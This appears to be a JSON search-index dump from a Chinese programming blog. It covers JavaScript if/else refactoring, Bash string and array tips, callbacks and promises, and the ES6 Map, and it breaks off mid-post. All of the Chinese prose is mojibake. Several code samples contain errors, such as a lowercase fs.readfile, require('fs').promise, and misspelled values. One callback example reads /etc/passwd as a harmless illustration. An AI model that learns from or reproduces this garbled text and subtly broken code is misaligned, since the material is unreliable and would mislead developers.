å°±å¾ˆå¥½ç†è§£äº†ã€‚\n","date":"2022-06-21","img":"","permalink":"https://rendoumi.com/posts/20220621-javascripts_how_to_run/","series":null,"tags":null,"title":"JavaScript åˆ°åº•æ˜¯å¦‚ä½•æ‰§è¡Œçš„å‘¢ -- JSçš„ä½œåŸç†"},{"categories":null,"content":"Javascripts ä¸­çš„ if \u0026hellip; else ç”¨èµ·æ¥å€’æ˜¯å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯çœ‹èµ·æ¥å°±ä¸èˆ’æœäº†\n1if (true) { 2} 3 4if (true) { 5} 6 7if (true) { 8 if (true) { 9 if (true) { 10 } 11 } else { 12 } 13} else { 14} ä¸Šé¢çœ‹èµ·æ¥å¾ˆé—¹å¿ƒå§ï¼Œä¸‹é¢è®²è®²ä¼˜åŒ–ï¼š\nä¸€ã€ä¸‰å…ƒä¼˜åŒ– if (ture) elseå¯ä»¥ç”¨ä¸‰å…ƒæ“ä½œç¬¦æ¥ä¼˜åŒ–å®ƒï¼š\n1// Bad ğŸ˜¥ 2if (true) { 3 console.log(\u0026#34;Congratutions!\u0026#34;) 4} else { 5 console.warn(\u0026#34;Oops, something went wrong!\u0026#34;) 6} 7 8// Great ğŸ¥° 9true 10 ? console.log(\u0026#34;Congratutions\u0026#34;) 11 : console.warn(\u0026#34;Oops, something went wrong!\u0026#34;) äºŒã€ä¸ä¼˜åŒ– trueçš„æƒ…å†µä¸‹æ‰æ‰§è¡Œå¯ä»¥ç”¨ä¸æ¥è¿›è¡Œä¼˜åŒ–ï¼š\n1if (true) { 2 alert(1) 3} 4 5// is equals to: 6 7true \u0026amp;\u0026amp; alert(1) ä¸‰ã€æå‰è¿”å› å¦‚æœæœ‰å¤šä¸ªåˆ¤æ–­ï¼ŒæŒ‰ç…§å¤æ‚ç¨‹åº¦ï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œæå‰è¿”å›ã€‚\n1function handleRequest(req) { 2 if (req.code \u0026gt;= 500) { 3 return \u0026#34;Server error\u0026#34;; 4 } 5 if (req.code \u0026gt;= 404) { 6 return \u0026#34;Cilent error\u0026#34;; 7 } 8 return \u0026#34;Suceess\u0026#34;; 9} å››ã€ç±»è¡¨æ ¼ä¼˜åŒ– ä¸‹é¢æ˜¯ç±»ä¼¼è¡¨æ ¼ä¼¼çš„é€‰æ‹©ï¼Œé€šå¸¸ä¼šç”¨ switch æ¥è¿›è¡Œä¼˜åŒ–\n1// Bad ğŸ˜¥ 2const weekday = (num) =\u0026gt; { 3 if (num === 1) { 4 return \u0026#34;Monday\u0026#34; 5 } else if (num === 2) { 6 return \u0026#34;Tuesday\u0026#34; 7 } else if (num === 3) { 8 return \u0026#34;Wednesday\u0026#34; 9 } else if (num === 4) { 10 return \u0026#34;Thursday\u0026#34; 11 } else if (num === 5) { 12 return \u0026#34;Friday\u0026#34; 13 } else if (num === 6) { 14 return \u0026#34;Saturday\u0026#34; 15 } else if (num === 7) { 16 return \u0026#34;Sunday\u0026#34; 17 } else { 18 return \u0026#34;Unknown\u0026#34; 19 } 20} 21 22console.log(weekday(1)) // Monday switch ä¹Ÿä¸æ˜¯æœ€ä¼˜è§£ï¼Œç”¨å¯¹è±¡çš„é”®å€¼å¯¹æ¥è§£ï¼š\n1const weekday = (option) =\u0026gt; { 2 let obj = { 3 1: \u0026#34;Monday\u0026#34;, 4 2: \u0026#34;Tuesday\u0026#34;, 5 3: \u0026#34;Wednesday\u0026#34;, 6 4: \u0026#34;Thursday\u0026#34;, 7 5: \u0026#34;Friday\u0026#34;, 8 6: \u0026#34;Saturday\u0026#34;, 9 0: \u0026#34;Sunday\u0026#34; 10 } 11 return obj[option] ?? \u0026#34;Unknown\u0026#34; 12} 13 14console.log(weekday(1)) // Monday ä¹Ÿå¯ä»¥ç”¨ ES6 çš„ map æ¥å®ç°ï¼š\n1// Great ğŸ¥° 2const weekday = (num) =\u0026gt; { 3 const map = new Map() 4 .set(1, \u0026#34;Monday\u0026#34;) 5 .set(2, \u0026#34;Tuesday\u0026#34;) 6 .set(3, \u0026#34;Wednesday\u0026#34;) 7 .set(4, \u0026#34;Thursday\u0026#34;) 8 .set(5, \u0026#34;Friday\u0026#34;) 9 .set(6, \u0026#34;Saturday\u0026#34;) 10 .set(7, \u0026#34;Sunday\u0026#34;); 11 return map.has(num) ? map.get(num) : \u0026#34;Unknown\u0026#34;; 12}; 13 14console.log(weekday(1)); äº”ã€é€‰é¡¹å¤šå¯¹ä¸€çš„æ•°ç»„ä¼˜åŒ– çœ‹å¦‚ä¸‹ä»£ç ï¼Œå¤šä¸ªé€‰é¡¹å¯¹åº”ä¸€ä¸ªè¿”å›ï¼š\n1const getContinent = (option) =\u0026gt; { 2 if (option === \u0026#34;China\u0026#34; || option === \u0026#34;Japan\u0026#34;) { 3 return \u0026#34;Asia\u0026#34;; 4 } 5 if (option === \u0026#34;Germany\u0026#34; || option === \u0026#34;France\u0026#34;) { 6 return \u0026#34;Europe\u0026#34;; 7 } 8}; 9 10console.log(getContinent(\u0026#34;China\u0026#34;)); ä½¿ç”¨æ•°ç»„æ¥å®¹çº³å¤šä¸ªé€‰é¡¹ï¼Œç„¶åç”¨ includes æ¥åˆ¤æ–­å¹¶è¿”å›\n1const getContinent = (option) =\u0026gt; { 2 const Asia = [\u0026#34;China\u0026#34;, \u0026#34;Japan\u0026#34;]; 3 const Europe = [\u0026#34;Germany\u0026#34;, \u0026#34;Franch\u0026#34;]; 4 if (Asia.includes(option)) return \u0026#34;Asia\u0026#34;; 5 if (Europe.includes(option)) return \u0026#34;Europe\u0026#34;; 6 return \u0026#34;Unknown\u0026#34;; 7}; 8 9console.log(getContinent(\u0026#34;China\u0026#34;)); // Asia è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œç”¨ \u0026amp;\u0026amp; ä¸ä¼˜åŒ–\n1const getContinent = (option) =\u0026gt; { 2 let [result, setResult] = [\u0026#34;unknown\u0026#34;, (str) =\u0026gt; (result = str)]; 3 const Asia = [\u0026#34;China\u0026#34;, \u0026#34;Japan\u0026#34;]; 4 const Europe = [\u0026#34;Germany\u0026#34;, \u0026#34;Franch\u0026#34;]; 5 Asia.includes(option) \u0026amp;\u0026amp; setResult(\u0026#34;Asia\u0026#34;); 6 Europe.includes(option) \u0026amp;\u0026amp; setResult(\u0026#34;Europe\u0026#34;); 7 return result; 8}; 9 10console.log(getContinent(\u0026#34;China\u0026#34;)); ","date":"2022-06-15","img":"","permalink":"https://rendoumi.com/posts/20220615-javascripts_if/","series":null,"tags":null,"title":"Javascriptsä¸­ifçš„ä¼˜åŒ–"},{"categories":null,"content":"Shellè„šæœ¬çš„è¿›é˜¶æŠ€å·§ï¼š\nä¸€ã€String ç±»çš„æŠ€å·§ Stringç±»å½“ä½œæ•°ç»„æ¥ä½¿ç”¨ï¼Œæ³¨æ„èŒƒå›´çš„ä¸‹æ ‡ï¼Œ0:4ï¼Œ4æœ€åè¦è¢«è¸¢æ‰ï¼Œå®é™…æ˜¯0-3ï¼Œå…±4ä¸ªå­—ç¬¦ï¼š\n1string=\u0026#34;Bash is great!\u0026#34; 2 3echo ${string:8} # great! 4echo ${string:0:4} # Bash 5echo ${string:8:-1} # great (-1: upto 1st element from right) æ•°ç»„çš„é•¿åº¦ï¼š\n1string=\u0026#34;Bash is great!\u0026#34;; 2len=${#string} 3echo \u0026#34;len = $len\u0026#34; å­—ç¬¦ä¸²çš„æ›¿æ¢ï¼š\n1string=\u0026#34;Bash is great!!\u0026#34; 2echo ${string/Bash/GNU Bash} # GNU Bash is great!! 3echo ${string//!/.} # Bash is great.. å¤§å°å†™æ›¿æ¢:\n1string=\u0026#34;Bash\u0026#34; 2echo ${string^^} # BASH 3echo ${string,,} # bash æŒ‰indexå­˜å–æ•°ç»„ä¸­å­—ç¬¦åœ¨shellä¸­ä¸å¯ç”¨ï¼Œä½†æ˜¯å¯ä»¥ç”¨functionå˜ç›¸å®ç°ï¼š\n1function charAt() { 2 string=$1 3 i=$2 4 echo ${string:i:1} 5} 6echo $(charAt \u0026#34;Hello\u0026#34; 2) # l 7echo $(charAt \u0026#34;Hello\u0026#34; 1) # e äºŒã€æ•°ç»„å’Œå­—å…¸ å®šä¹‰ä¸€ä¸ªæ•°ç»„å¹¶ä¸”éå†å®ƒï¼š\n1A=(2 4 5 6 4) 2for i in ${A[@]}; do 3 echo -n \u0026#34;${i} \u0026#34; # 2 4 5 6 4 4done åŒæ ·å¯¹æ•°ç»„è¿›è¡Œåˆ‡å‰²ï¼š\n1A=(2 4 5 6 4) 2echo ${A[@]:2:3} # 5 6 4 3echo ${A[@]:0:1} # 2 Bash ä¸­çš„æ•°ç»„éœ€è¦ä½¿ç”¨ [@] ç¬¦å·æ¥å¼•ç”¨æ•´ä¸ªæ•°ç»„ï¼Œå¯ä»¥ç”¨ç®€æ´çš„è¯­æ³•å¯¹æ•°ç»„å¢åŠ å…ƒç´ \n1A=(1 2 3) 2A+=(4) 3echo ${A[@]} # 1 2 3 4 4A+=(5 6) 5echo ${A[@]} # 1 2 3 4 5 6 å­—å…¸ä¹Ÿä¸€æ ·\n1declare -A D 2D=([\u0026#34;one\u0026#34;]=1 [\u0026#34;two\u0026#34;]=2 [\u0026#34;three\u0026#34;]=3) 3for i in ${!D[@]}; do 4 echo \u0026#34;$i -\u0026gt; ${D[$i]}\u0026#34; # one -\u0026gt; 1 .... 5done ä¸‰ã€æ•°å­¦è®¡ç®— ç®€å•çš„æ•°å­¦è®¡ç®—å¯ä»¥ç”¨ $((...)) æ¥å®Œæˆï¼š\n1a=10 2b=5 3 4echo \u0026#34;$a + $b = $((a + b))\u0026#34; # 10 + 5 = 15 5echo \u0026#34;$a - $b = $((a - b))\u0026#34; # 10 - 5 = 5 6echo \u0026#34;$a x $b = $((a * b))\u0026#34; # 10 x 5 = 50 7echo \u0026#34;$a / $b = $((a / b))\u0026#34; # 10 / 5 = 2 8echo \u0026#34;$a % $b = $((a % b))\u0026#34; # 10 % 5 = 0 æˆ–è€…å€ŸåŠ©å¤æ‚ä¸€ç‚¹çš„ bc æ¥å®Œæˆï¼š\n1a=10 2b=5.7 3 4echo \u0026#34;$a / $b = $(echo \u0026#34;scale = 2; $a / $b\u0026#34; | bc)\u0026#34; # 10 / 5.7 = 1.75 éšæœºæ•°çš„äº§ç”Ÿï¼š\n1echo $(($RANDOM % 10)) # Random number between 0 and 10 å››ã€è¾“å…¥ æ§åˆ¶è¾“å…¥å˜é‡ï¼š\n1read -p \u0026#34;Enter your name: \u0026#34; name 2echo \u0026#34;Hello, $name\u0026#34; å¦‚æœè¦è¾“å…¥æ•°ç»„ï¼š\n1read -p \u0026#34;Enter numbers: \u0026#34; -a A 2echo ${A[@]} å€ŸåŠ©ä¸Šé¢çš„æŠ€å·§ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºä¸€äº›å¤æ‚çš„ shell è„šæœ¬äº†\n","date":"2022-06-09","img":"","permalink":"https://rendoumi.com/posts/20220609-shell_tips/","series":null,"tags":null,"title":"Shellè¿›é˜¶æŠ€å·§"},{"categories":null,"content":"ä¸€ã€åŸºæœ¬æ¦‚å¿µ\n1. å¼‚æ­¥\næ‰€è°“ \u0026quot; å¼‚æ­¥ \u0026ldquo;ï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ªä»»åŠ¡åˆ†æˆä¸¤æ®µï¼Œ å…ˆæ‰§è¡Œç¬¬ä¸€æ®µï¼Œ ç„¶åè½¬è€Œæ‰§è¡Œå…¶ä»–ä»»åŠ¡å»ï¼Œ ç­‰åšå¥½äº†å‡†å¤‡ï¼Œ å†å›è¿‡å¤´æ‰§è¡Œç¬¬äºŒæ®µã€‚\næ¯”å¦‚ï¼Œ æœ‰ä¸€ä¸ªä»»åŠ¡æ˜¯è¯»å–æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œ ä»»åŠ¡çš„ç¬¬ä¸€æ®µæ˜¯å‘æ“ä½œç³»ç»Ÿå‘å‡ºè¯·æ±‚ï¼Œ è¦æ±‚è¯»å–æ–‡ä»¶ã€‚ ç„¶åï¼Œ ç¨‹åºæ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œ ç­‰åˆ°æ“ä½œç³»ç»Ÿè¿”å›æ–‡ä»¶ï¼Œå†æ¥ç€æ‰§è¡Œä»»åŠ¡çš„ç¬¬äºŒæ®µï¼ˆ å¤„ç†æ–‡ä»¶ï¼‰ã€‚ è¿™ç§ä¸è¿ç»­çš„æ‰§è¡Œï¼Œ å°±å«åšå¼‚æ­¥ã€‚\nç›¸åº”åœ°ï¼Œ è¿ç»­çš„æ‰§è¡Œå°±å«åšåŒæ­¥ã€‚ ç”±äºæ˜¯è¿ç»­æ‰§è¡Œï¼Œ ä¸èƒ½æ’å…¥å…¶ä»–ä»»åŠ¡ï¼Œ æ‰€ä»¥æ“ä½œç³»ç»Ÿä»ç¡¬ç›˜è¯»å–æ–‡ä»¶çš„è¿™æ®µæ—¶é—´ï¼Œ ç¨‹åºåªèƒ½å¹²ç­‰ç€ä»€ä¹ˆä¹Ÿåšä¸äº†ã€‚\n2. å›è°ƒå‡½æ•°\njavascript è¯­è¨€å¯¹å¼‚æ­¥ç¼–ç¨‹çš„å®ç°ï¼Œ å°±æ˜¯å›è°ƒå‡½æ•°ã€‚ æ‰€è°“å›è°ƒå‡½æ•°ï¼Œ å°±æ˜¯æŠŠä»»åŠ¡çš„ç¬¬äºŒæ®µå•ç‹¬å†™åœ¨ä¸€ä¸ªå‡½æ•°é‡Œé¢ï¼Œ ç­‰åˆ°å‡†å¤‡å¥½äº†ï¼Œç»§ç»­æ‰§è¡Œçš„æ—¶å€™ï¼Œ å°±ç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚ å®ƒçš„è‹±è¯­åå­— callbackï¼Œ ç›´è¯‘è¿‡æ¥å°±æ˜¯ \u0026quot; å›è°ƒ \u0026ldquo;ã€‚\nè¯»å–æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œ æ˜¯è¿™æ ·çš„ï¼Œreadfile æ˜¯å¼‚æ­¥çš„ï¼ŒreadfileSync æ˜¯åŒæ­¥çš„ã€‚\n1fs.readfile(\u0026#39;/etc/passwd\u0026#39;, function(err, data) { 2 if(err) throw err; 3 console.log(data); 4}); ä¸Šé¢ä»£ç ä¸­ï¼Œ readfile å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œ å°±æ˜¯å›è°ƒå‡½æ•°ï¼Œ ä¹Ÿå°±æ˜¯ä»»åŠ¡çš„ç¬¬äºŒæ®µã€‚ ç­‰åˆ°æ“ä½œç³»ç»Ÿè¿”å›äº† / etc / passwdè¿™ä¸ªæ–‡ä»¶ä»¥åï¼Œ å›è°ƒå‡½æ•°æ‰ä¼šæ‰§è¡Œã€‚\n==ä¸€ä¸ªæœ‰è¶£çš„é—®é¢˜æ˜¯ï¼Œ ä¸ºä»€ä¹ˆ node.js çº¦å®šï¼Œ å›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ å¿…é¡»æ˜¯é”™è¯¯å¯¹è±¡ errï¼ˆ å¦‚æœæ²¡æœ‰é”™è¯¯ï¼Œ è¯¥å‚æ•°å°±æ˜¯ nullï¼‰ï¼Ÿ åŸå› æ˜¯æ‰§è¡Œåˆ†æˆä¸¤æ®µï¼Œ åœ¨è¿™ä¸¤æ®µä¹‹é—´æŠ›å‡ºçš„é”™è¯¯ï¼Œ ç¨‹åºæ— æ³•æ•æ‰ï¼Œ åªèƒ½å½“ä½œå‚æ•°ï¼Œ ä¼ å…¥ç¬¬äºŒæ®µã€‚==\n3. promise\nâ€œæƒ³åƒä¸€ä¸‹ä½ æ˜¯ä¸ªå°å­©ï¼Œä½ å¦ˆå¦ˆ promise æ‰¿è¯ºä½ ä¸‹æ˜ŸæœŸç»™ä½ ä¸€éƒ¨æ–°æ‰‹æœºâ€\nåªæœ‰ä¸‹å‘¨æ¥ä¸´çš„æ—¶å€™ï¼Œä½ æ‰ä¼šçŸ¥é“ä½ çœŸçš„å¾—åˆ°ä¸€éƒ¨æ‰‹æœºï¼Œæˆ–è€…æ˜¯éª—ä½ ç©çš„ã€‚\nè¿™å°±æ˜¯ promise. ä¸€ä¸ª promise æœ‰ä¸‰ç§çŠ¶æ€ï¼š\nPending: å¾…å®šï¼Œä½ ä¸çŸ¥é“ä½ æ˜¯å¦èƒ½å¾—åˆ°ä¸€éƒ¨æ‰‹æœº Resolved: å¦ˆå¦ˆå¾ˆé«˜å…´ï¼Œä½ å¾—åˆ°ä¸€éƒ¨æ‰‹æœº Rejected: å¦ˆå¦ˆä¸é«˜å…´ï¼Œä½ æ²¡æœ‰å¾—åˆ°ä¸€éƒ¨æ‰‹æœº çŠ¶æ€å›¾å¦‚ä¸‹ï¼š\nè¯­æ³•å¾ˆç®€å•ï¼š\n1// promise syntax look like this 2new Promise(function (resolve, reject) { ... } ); å†çœ‹ä¸€ä¸‹ä¸Šé¢é—®é¢˜çš„è§£å†³æ–¹æ³•ï¼š\né¦–å…ˆç¡®å®š Mom çš„çŠ¶æ€æ˜¯ unhappyï¼Œç„¶åå»ºç«‹ä¸€ä¸ª Promise æ¥ç¡®å®šæ˜¯å¦å¾—åˆ°æ‰‹æœºï¼Œæœ€åç”¨ä¸€ä¸ªå‡½æ•° askMom æ¥è°ƒç”¨è¿™ä¸ª Promise\nresolve() ä¸­å¯ä»¥æ”¾ç½®ä¸€ä¸ªå‚æ•°ç”¨äºå‘ä¸‹ä¸€ä¸ª then ä¼ é€’ä¸€ä¸ªå€¼ï¼Œthen ä¸­çš„å‡½æ•°ä¹Ÿå¯ä»¥è¿”å›ä¸€ä¸ªå€¼ä¼ é€’ç»™ thenã€‚ä½†æ˜¯ï¼Œå¦‚æœ then ä¸­è¿”å›çš„æ˜¯ä¸€ä¸ª Promise å¯¹è±¡ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ª then å°†ç›¸å½“äºå¯¹è¿™ä¸ªè¿”å›çš„ Promise è¿›è¡Œæ“ä½œã€‚\nreject() å‚æ•°ä¸­ä¸€èˆ¬ä¼šä¼ é€’ä¸€ä¸ªå¼‚å¸¸ç»™ä¹‹åçš„ catch å‡½æ•°ç”¨äºå¤„ç†å¼‚å¸¸ã€‚\nä½†æ˜¯è¯·æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š\nresolve å’Œ reject çš„ä½œç”¨åŸŸåªæœ‰èµ·å§‹å‡½æ•°ï¼Œä¸åŒ…æ‹¬ then ä»¥åŠå…¶ä»–åºåˆ—ï¼› resolve å’Œ reject å¹¶ä¸èƒ½å¤Ÿä½¿èµ·å§‹å‡½æ•°åœæ­¢è¿è¡Œï¼Œåˆ«å¿˜äº† returnã€‚ 1var isMomHappy = false; 2 3// Promise 4var willIGetNewPhone = new Promise( 5 function (resolve, reject) { 6 if (isMomHappy) { 7 var phone = { 8 brand: \u0026#39;Samsung\u0026#39;, 9 color: \u0026#39;black\u0026#39; 10 }; 11 resolve(phone); // resolved 12 } else { 13 var reason = new Error(\u0026#39;mom is not happy\u0026#39;); 14 reject(reason); // rejected 15 } 16 17 } 18); 19 20var askMom = function () { 21 willIGetNewPhone 22 .then(function (fulfilled) { 23 // yay, you got a new phone 24 console.log(fulfilled); 25 // output: { brand: \u0026#39;Samsung\u0026#39;, color: \u0026#39;black\u0026#39; } 26 }) 27 .catch(function (error) { 28 // oops, mom didn\u0026#39;t buy it 29 console.log(error.message); 30 // output: \u0026#39;mom is not happy\u0026#39; 31 }); 32}; 33 34askMom(); å¾ˆæœ‰ç‚¹æ„æ€å§ã€‚æŠ½è±¡äº†ï¼Œé‚£å°±å®é™…ç‚¹ã€‚\njavascripts ä¸­çš„ fetch å‡½æ•°å°±æ˜¯åŸºäºPromiseèŒƒå¼çš„ï¼Œpromise çš„ resolves ç»‘åœ¨äº† Response ä¸Šã€‚Promise ç±»æœ‰ .then() .catch() å’Œ .finally() ä¸‰ä¸ªæ–¹æ³•ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•çš„å‚æ•°éƒ½æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œ.then() å¯ä»¥å°†å‚æ•°ä¸­çš„å‡½æ•°æ·»åŠ åˆ°å½“å‰ Promise çš„æ­£å¸¸æ‰§è¡Œåºåˆ—ï¼Œ.catch() åˆ™æ˜¯è®¾å®š Promise çš„å¼‚å¸¸å¤„ç†åºåˆ—ï¼Œ.finally() æ˜¯åœ¨ Promise æ‰§è¡Œçš„æœ€åä¸€å®šä¼šæ‰§è¡Œçš„åºåˆ—ã€‚ .then() ä¼ å…¥çš„å‡½æ•°ä¼šæŒ‰é¡ºåºä¾æ¬¡æ‰§è¡Œï¼Œæœ‰ä»»ä½•å¼‚å¸¸éƒ½ä¼šç›´æ¥è·³åˆ° catch åºåˆ—ï¼š\n1 fetch(\u0026#34;http://192.168.1.6/graph_image_hubot.php?action=view\u0026amp;local_graph_id=13619\u0026amp;rra_id=5\u0026#34;) 2 .then(response =\u0026gt; { 3 if (response.ok) { 4 return response.buffer(); 5 } 6 throw new Error(\u0026#39;Network response was not ok.\u0026#39;); 7 }) 8 .then(buffer =\u0026gt; { 9 const formData = new FormData(); 10 formData.append( \u0026#39;media\u0026#39;, buffer, {filename: \u0026#39;bandwidth.png\u0026#39;, contentType: \u0026#39;image/png\u0026#39; } ); 11 robot.wwork.sendImageMessage(owner, formData); 12 }); ä¸Šé¢çš„ç¨‹åºå®é™…ä¸Šæ˜¯ä» cacti æœåŠ¡å™¨æ‹¿åˆ°ä¸€å¼ æµé‡å›¾ç‰‡ï¼Œç„¶å fetch çš„ç»“æœ anywayï¼Œresponseæ€»æ˜¯æœ‰ä¸œè¥¿çš„ï¼Œéƒ½ä¼šæ˜¯æˆåŠŸçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»å†ç”¨ response.ok æ¥åˆ¤æ–­ï¼ŒæˆåŠŸå°±ç»§ç»­å¾—åˆ° buffer æµï¼Œæœ€ç»ˆé€åˆ° hubot ä¸­å»ã€‚ä¸‰ä¸ªè¿‡ç¨‹ç”¨ then ä¸²äº†èµ·æ¥ï¼Œæ¯ä¸€æ­¥éƒ½æˆåŠŸæ‰ä¼šè¿›è¡Œä¸‹ä¸€æ­¥ã€‚\nè¿™æ ·å†™é¿å…äº†å›è°ƒåœ°ç‹±ï¼Œçœ‹èµ·æ¥ä¹Ÿæ¯”è¾ƒèˆ’æœã€‚\né‚£ä»€ä¹ˆæ—¶å€™ç”¨ promise å‘¢ï¼Œå®ƒæ˜¯å¼‚æ­¥çš„ï¼Œæœ‰å¤§IOè¯»å†™ç¡¬ç›˜ã€è¯»å†™ç½‘ç»œçš„æ—¶å€™ç”¨ï¼Œä¸Šé¢æ˜¯è¯»å†™ç½‘ç»œã€‚ä¸‹é¢å†æ¥ä¸€ä¸ªè¯»å†™ç£ç›˜çš„ï¼š\n1const {promise: {readFile, writeFile}} = require(\u0026#39;fs\u0026#39;); 2(async () =\u0026gt; { 3 let content = await readFile(\u0026#39;./data.txt\u0026#39;, \u0026#39;utf8\u0026#39;); 4 await writeFile(\u0026#39;2.txt\u0026#39;, content, \u0026#39;utf8\u0026#39;); 5 console.log(\u0026#39;ok\u0026#39;); 6})(); ä¸Šé¢çš„è¯­æ³•æ˜¯ ES7 çš„ï¼Œå®ƒæ›´å°½äº†ä¸€æ­¥ï¼Œé¦–å…ˆå£°æ˜ä¸€ä¸ªåŒ¿åçš„å‡½æ•°æ˜¯ async å¼‚æ­¥çš„ï¼Œç„¶åç”¨awaitæ¥è¿›è¡Œç­‰å¾…ï¼Œå°†è¯»å’Œå†™ä¸¤ä¸ªå¤§æ“ä½œéƒ½æ”¾åˆ° await çš„ä¸€æ­¥æ“ä½œä¸­å»ï¼Œè¿™æ ·ç¨‹åºçœ‹èµ·æ¥å°±å˜æˆåŒæ­¥çš„ä¸€æ­¥æ­¥ç­‰å¾…äº†ã€‚è·Ÿ ES6 çš„ promise æ¯”èµ·æ¥ï¼Œæ›´è¿›äº†ä¸€æ­¥ã€‚\n","date":"2022-05-24","img":"","permalink":"https://rendoumi.com/posts/20220524-javascripts_promise/","series":null,"tags":null,"title":"Javascriptsä¸­çš„promise"},{"categories":null,"content":"Javascripts ä¸­çš„ map\nè¯´åˆ°mapï¼Œå¦‚æœæˆ‘ä»¬æœ‰å¾ªç¯çš„è¯ï¼Œä¸åœéå†ï¼Œä¼šæŠŠæ—¶é—´ææˆ O(n)ã€‚å¦‚æœæœ‰mapï¼Œæ—¶é—´å°±å˜æˆäº†O(1)ï¼Œæ‰€ä»¥è¿˜æ˜¯ç›¸å½“æœ‰æ•ˆç‡çš„ã€‚\nmap æ˜¯ ES2015 ä¸­æ–°å¢åŠ çš„ï¼Œæ˜¯ä¸€ç§æ–°çš„ Object ç±»å‹ï¼Œå…è®¸å­˜æ”¾å„ç§ key-value å¯¹ã€‚\nmap æœ€å¤§çš„ç‰¹æ€§æ˜¯ï¼Œkey å¯ä»¥æ˜¯ä»»ä½•ç±»å‹ï¼ŒåŒ…æ‹¬ object å’Œ functionï¼›å¯ä»¥è°ƒç”¨ size å¾—åˆ° map çš„å¤§å°ï¼›è¿­ä»£çš„æ—¶å€™ï¼Œæ˜¯ä¸¥æ ¼æŒ‰ç…§æ·»åŠ çš„é¡ºåºè¿›è¡Œè¿­ä»£çš„ã€‚\nmap çš„æ–¹æ³•å¦‚ä¸‹ï¼š set, get, size, has, delete, clear:\n1let things = new Map(); 2 3const myFunc = () =\u0026gt; \u0026#39;ğŸ•\u0026#39;; 4 5things.set(\u0026#39;ğŸš—\u0026#39;, \u0026#39;Car\u0026#39;); 6things.set(\u0026#39;ğŸ \u0026#39;, \u0026#39;House\u0026#39;); 7things.set(\u0026#39;âœˆï¸\u0026#39;, \u0026#39;Airplane\u0026#39;); 8things.set(myFunc, \u0026#39;ğŸ˜„ Key is a function!\u0026#39;); 9 10things.size; // 4 11 12things.has(\u0026#39;ğŸš—\u0026#39;); // true 13 14things.has(myFunc) // true 15things.has(() =\u0026gt; \u0026#39;ğŸ•\u0026#39;); // false, not the same reference 16things.get(myFunc); // \u0026#39;ğŸ˜„ Key is a function!\u0026#39; 17 18things.delete(\u0026#39;âœˆï¸\u0026#39;); 19things.has(\u0026#39;âœˆï¸\u0026#39;); // false 20 21things.clear(); 22things.size; // 0 23 24// setting key-value pairs is chainable 25things.set(\u0026#39;ğŸ”§\u0026#39;, \u0026#39;Wrench\u0026#39;) 26 .set(\u0026#39;ğŸ¸\u0026#39;, \u0026#39;Guitar\u0026#39;) 27 .set(\u0026#39;ğŸ•¹\u0026#39;, \u0026#39;Joystick\u0026#39;); 28 29const myMap = new Map(); 30 31// Even another map can be a key 32things.set(myMap, \u0026#39;Oh gosh!\u0026#39;); 33things.size; // 4 34things.get(myMap); // \u0026#39;Oh gosh!\u0026#39; è¿­ä»£å®ƒçš„æ–¹æ³•ï¼Œå¯ä»¥ç”¨ for \u0026hellip; ofï¼Œé¡ºåºæ˜¯ä¸¥æ ¼æŒ‰ç…§ä½ æ’å…¥çš„é¡ºåºæ¥çš„ï¼š\n1let activities = new Map(); 2 3activities.set(1, \u0026#39;ğŸ‚\u0026#39;); 4activities.set(2, \u0026#39;ğŸ\u0026#39;); 5activities.set(3, \u0026#39;ğŸš£\u0026#39;); 6activities.set(4, \u0026#39;ğŸ¤¾\u0026#39;); 7 8for (let [nb, activity] of activities) { 9 console.log(`Activity ${nb} is ${activity}`); 10} 11 12// Activity 1 is ğŸ‚ 13// Activity 2 is ğŸ 14// Activity 3 is ğŸš£ 15// Activity 4 is ğŸ¤¾ ä¹Ÿå¯ä»¥ç”¨ forEach æ¥è¿­ä»£ï¼Œæ³¨æ„ä¸€ç‚¹å³å¯ï¼ŒforEach çš„ callback å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ valueï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ keyï¼Œè·Ÿ for \u0026hellip; of æ˜¯ç›¸åçš„ï¼š\n1activities.forEach((value, key) =\u0026gt; { 2 console.log(`Activity ${key} is ${value}`); 3}); ","date":"2022-05-23","img":"","permalink":"https://rendoumi.com/posts/20220523-javascripts_map/","series":null,"tags":null,"title":"Javascriptsä¸­çš„map"},{"categories":null,"content":"åƒé‡Œä¹‹è¡Œå§‹äºè¶³ä¸‹ï¼Œjavascript æ¨¡å—æ¼«å¤©é£ï¼Œèƒ½åšçš„äº‹ä¹Ÿæ˜¯äº”èŠ±å…«é—¨ã€‚æˆ‘ä»¬æ¥å®è·µä¸€ä¸‹\nå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\né‡Œé¢æ˜¯ä¸€è¡Œè¡Œæ•°æ®ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠæ‰€æœ‰å€¼å–æ•´æ±‚å’Œï¼Œæ–‡ä»¶ä¸­æœ‰æŸäº›ç©ºè¡Œ\nå¾ˆç®€å•ï¼Œç¨‹åºå¦‚ä¸‹ï¼š\n1var fs = require(\u0026#39;fs\u0026#39;); 2 3calculate = () =\u0026gt; { 4 fs.readFile(\u0026#39;data.txt\u0026#39;, \u0026#39;utf8\u0026#39;, (err, data) =\u0026gt; { 5 if (err) { 6 throw new Error(err) 7 } 8 9 const arr = data.split(\u0026#39;\\r\\n\u0026#39;); 10 const result = arr 11 .filter(e =\u0026gt; e) 12 .map(parseFloat) 13 .reduce((curr, next) =\u0026gt; curr + next); 14 console.log(\u0026#39;RESULT: 